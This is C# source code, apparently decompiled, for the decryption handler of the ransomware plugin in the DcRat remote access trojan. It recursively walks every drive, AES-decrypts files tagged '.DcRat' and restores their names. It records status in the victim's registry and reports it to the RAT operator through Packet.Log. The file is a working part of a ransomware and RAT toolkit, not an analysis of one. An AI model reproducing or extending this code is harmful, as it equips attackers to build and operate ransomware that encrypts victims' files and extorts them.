using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Plugin.Handler;

public class HandleDecrypt
{
	public string Pass;

	private object C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3);

	public void BeforeDec()
	{
		new Thread(Dec).Start();
	}

	public void Dec()
	{
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\" + Connection.Hwid, "Rans-Status", "Decryption in progress...");
			Packet.Log("Decrypting...");
			System_Driver(Pass);
			Fix_Drivers(Pass);
			OtherDrivers(Pass);
			Thread.Sleep(1000);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\" + Connection.Hwid, "Rans-Status", "Decrypted");
			Packet.Log(Connection.Hwid + "Decrypted");
		}
		catch (Exception)
		{
		}
	}

	private void System_Driver(string password)
	{
		Dir_Dec(Conversions.ToString(C_DIR), password);
	}

	private void Fix_Drivers(string password)
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		foreach (string text in logicalDrives)
		{
			DriveInfo driveInfo = new DriveInfo(text);
			if (driveInfo.DriveType == DriveType.Fixed && !driveInfo.ToString().Contains(Conversions.ToString(C_DIR)))
			{
				string thePath = text;
				Dir_Dec(thePath, password);
			}
		}
	}

	private void OtherDrivers(string password)
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		foreach (string text in logicalDrives)
		{
			DriveInfo driveInfo = new DriveInfo(text);
			if (driveInfo.DriveType != DriveType.Fixed && !driveInfo.ToString().Contains(Conversions.ToString(C_DIR)))
			{
				string thePath = text;
				Dir_Dec(thePath, password);
			}
		}
	}

	public byte[] AES_Dec(byte[] B2Dec, byte[] KeyBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(KeyBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.KeySize / 8.0));
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.BlockSize / 8.0));
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(B2Dec, 0, B2Dec.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public void File_Dec(string file, string key)
	{
		try
		{
			if (file.EndsWith(".DcRat"))
			{
				byte[] b2Dec = File.ReadAllBytes(file);
				byte[] bytes = Encoding.UTF8.GetBytes(key);
				bytes = SHA256.Create().ComputeHash(bytes);
				byte[] bytes2 = AES_Dec(b2Dec, bytes);
				File.WriteAllBytes(file, bytes2);
				string extension = Path.GetExtension(file);
				string destFileName = file.Substring(0, file.Length - extension.Length);
				File.Move(file, destFileName);
			}
		}
		catch (Exception)
		{
		}
	}

	public void Dir_Dec(string ThePath, string key)
	{
		try
		{
			string[] files = Directory.GetFiles(ThePath);
			string[] directories = Directory.GetDirectories(ThePath);
			int i = 0;
			for (int num = files.Length - 1; i <= num; i++)
			{
				File_Dec(files[i], key);
			}
			int j = 0;
			for (int num2 = directories.Length - 1; j <= num2; j++)
			{
				Dir_Dec(directories[j], key);
			}
		}
		catch (Exception)
		{
		}
	}
}
